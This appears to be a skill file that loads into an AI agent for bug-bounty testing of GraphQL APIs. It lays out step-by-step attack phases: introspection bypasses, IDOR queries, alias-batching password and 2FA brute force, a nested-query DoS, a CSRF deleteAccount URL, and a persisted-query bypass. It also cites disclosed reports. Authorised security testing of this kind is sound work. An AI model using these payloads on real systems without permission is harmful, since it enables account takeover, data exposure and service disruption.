---
name: hunt-graphql
description: GraphQL attack — introspection, batching, alias abuse, IDOR via field, csrf, depth/complexity DoS, persisted query bypass.
keywords: [graphql, introspection, alias batching, persisted query, apollo, hasura, depth limit, query batching]
---

# hunt-graphql

## When this skill loads

Triggers: "graphql", "/graphql", "introspection", "apollo", "hasura",
"persisted query", "alias batching", "graphiql".

## Pre-flight — enumerate endpoint

Common paths: `/graphql`, `/api/graphql`, `/v1/graphql`,
`/query`, `/gql`, `/graphiql` (dev console).

Detection POST:

```bash
curl -s -X POST https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
```

If `{"data":{"__typename":"Query"}}` → live.

## Phase 1 — introspection

```graphql
query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } }
fragment FullType on __Type { kind name fields { name type { name kind ofType { name kind } } args { name type { name kind } } } inputFields { name } enumValues { name } interfaces { name } possibleTypes { name } }
```

Or use Burp's GraphQL extension / `graphql-voyager` / `clairvoyance`.

If introspection disabled:

- Try with `GET` (some servers gate POST only)
- Try with content-type `application/x-www-form-urlencoded`:
  `query=%7B__schema...%7D`
- Try with `__type(name: "User")` direct probe — Apollo sometimes
  blocks `__schema` but not `__type`
- Field-suggestion attack: send a malformed query; many implementations
  reply with `"Did you mean 'firstName'?"` → enumerate by typo

## Phase 2 — authorization checks

For each query/mutation in the schema, test:

- Unauthenticated → does it require auth?
- Different roles (low-priv user vs admin) → field-level auth?
- Tenant boundary → can a query for `User(id:victim)` succeed cross-tenant?

GraphQL servers commonly defer auth to per-field resolvers; missing
checks here are the most frequent class of GraphQL bugs.

## Phase 3 — IDOR via GraphQL field

```graphql
query { user(id: "victim-uuid") { email phoneNumber address paymentMethods { last4 } } }
```

If id is sequential or UUID-leaked elsewhere, IDOR is one query away.
Also try:

- `node(id: "Base64-encoded-relay-id")` — relay nodes often skip auth
- `_users` Hasura system tables
- `me { ... }` then swap with `user(id:...)`

## Phase 4 — alias batching

Bypass per-request rate limit:

```graphql
query {
  a0: login(input:{email:"victim@example.com",password:"p1"}) { token }
  a1: login(input:{email:"victim@example.com",password:"p2"}) { token }
  a2: login(input:{email:"victim@example.com",password:"p3"}) { token }
  ... a999
}
```

One HTTP request, 1000 login attempts. Disclosed by Shopify, etc.

Mitigation: per-alias rate limiting. Test by sending 100 aliased
mutations and counting responses.

## Phase 5 — query batching (array form)

```json
[
  {"query":"mutation { login(...) { token } }"},
  {"query":"mutation { login(...) { token } }"},
  ...
]
```

Same effect, different syntax. Servers often gate one but not the other.

## Phase 6 — depth / complexity DoS

```graphql
query {
  users { friends { friends { friends { friends { friends { id } } } } } }
}
```

If response time grows exponentially, no depth limit. Most programs
exclude DoS-only, but **chain** with auth bypass for impact.

## Phase 7 — CSRF via GET

Apollo + GET requests = full CSRF if no SameSite cookies:

```
https://target/graphql?query=mutation{deleteAccount}
```

Mitigation: require `Content-Type: application/json` (preflight
forces CORS). Bypass: `application/graphql` (some implementations
accept), `text/plain`, `application/x-www-form-urlencoded`
(if accepted).

## Phase 8 — persisted query bypass

Apollo's "persisted query" mode hashes queries; only known hashes
allowed. Bypass:

- Send `extensions.persistedQuery.sha256Hash` with a new query in
  the same request — APQ auto-registers it
- Find old hash → reuse on new endpoint
- `__schema` introspection sometimes not subject to allowlist

## Phase 9 — error-based info leak

GraphQL errors often leak:

- Field types ("Expected `String`, got `Int`")
- Stack traces with file paths
- DB column names
- Foreign-key relations ("Foreign key violation on `users.org_id`")

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #1130828 (HackerOne) | Blind SQLi via GraphQL where ID concatenated |
| H1 #1093706 (Shopify) | Alias batching → brute force 2FA |
| H1 #962653 (HackerOne) | CSRF via GET query bypass |
| H1 #2052158 | Persisted query bypass via APQ auto-register |
| CVE-2023-32731 (grpc-graphql) | Introspection disclosed despite "disabled" |
| Hasura: missing `x-hasura-role` validation → admin access |

## Never-submit fallbacks

- "Introspection enabled" alone → KILL (need actual leveraged impact)
- "No query depth limit" alone → DOWNGRADE (DoS-only is excluded
  in 95% of programs)
- Field suggestion leakage alone → KILL

## See also

- `hunt-idor` — GraphQL IDOR is just IDOR with a fancier query
- `hunt-sqli` — argument values flow into SQL
- `hunt-race` — alias batching is a race-condition primitive
- `hunt-jwt` — GraphQL is almost always JWT-authed
